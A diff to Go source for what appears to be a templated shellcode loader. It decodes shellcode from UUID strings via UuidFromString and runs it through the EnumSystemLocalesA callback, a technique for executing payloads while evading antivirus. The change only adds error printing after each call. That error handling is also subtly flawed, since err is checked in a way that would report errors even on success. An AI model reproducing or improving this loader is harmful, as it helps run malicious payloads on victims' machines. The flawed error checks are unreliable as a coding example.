@@ -116,7 +116,10 @@ func run(shellcode []byte) {
 
 		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
 		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&f[0])), addrPtr)
-
+		if err != nil {
+			// handle the error
+			fmt.Println("Error:", err)
+		}
 		// RPC_S_OK = 0
 		if rpcStatus != 0 {
 			{{if .Debug}}
@@ -148,6 +151,10 @@ func run(shellcode []byte) {
 	printDebug("info","Try to execute shellcode")
 	{{end}}
 	ret, _, err := enumSystemLocalesA.Call(uintptr(dllOffset), 0)
+	if err != nil {
+		// handle the error
+		fmt.Println("Error:", err)
+	}	
 	if ret == 0 {
 		{{if .Debug}}
 		printDebug("error", "EnumSystemLocalesA GetLastError: %s", err.Error())
